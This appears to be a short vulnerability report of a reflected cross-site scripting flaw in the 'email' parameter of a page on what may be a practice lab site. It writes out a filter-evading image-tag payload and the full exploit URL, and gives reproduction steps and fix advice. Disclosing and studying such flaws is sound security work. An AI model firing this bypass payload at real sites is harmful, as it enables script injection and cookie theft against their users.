# Reflected Cross-Site Scripting (XSS) via `email` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `email` parameter of the application. User-supplied input is reflected into the HTML response without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="q2m8vt"
http://kzlabs.com/punishment/23.php?email=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
```

---

## Vulnerable Parameter

```text id="d7x4rp"
email
```

---

## Payload Used

```html id="k9n1zc"
<iMg src=x onerror=\u0063onfirm?.(1)>
```

---

## Steps to Reproduce

1. Open the vulnerable URL:

   ```text
   http://kzlabs.com/punishment/23.php?email=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
   ```

2. Observe that the payload is reflected in the response.

3. The JavaScript executes automatically and triggers a popup.

---

## Proof of Concept

```text id="t5v3qy"
http://kzlabs.com/punishment/23.php?email=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/f35b2355-7a02-484a-95fb-290c7aefc590" />


---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
